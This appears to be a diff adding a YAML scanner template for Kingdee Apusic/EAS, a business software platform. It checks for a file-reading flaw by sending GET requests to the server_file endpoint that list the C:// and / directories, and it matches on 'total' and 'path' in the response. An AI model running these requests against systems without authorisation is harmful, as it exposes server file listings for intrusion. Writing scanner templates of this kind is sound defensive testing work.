@@ -1,0 +1,20 @@
+name: 金蝶-Apusic-金蝶EAS-server_file-文件读取
+description: >-
+  读取整个目录
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /appmonitor/protected/selector/server_file/files?folder=C://&suffix=
+    expression:
+      status: 200
+      body_all:
+        - "total"
+        - "path"
+  - method: GET
+    path: /appmonitor/protected/selector/server_file/files?folder=/&suffix=
+    expression:
+      status: 200
+      body_all:
+        - "total"
+        - "path"
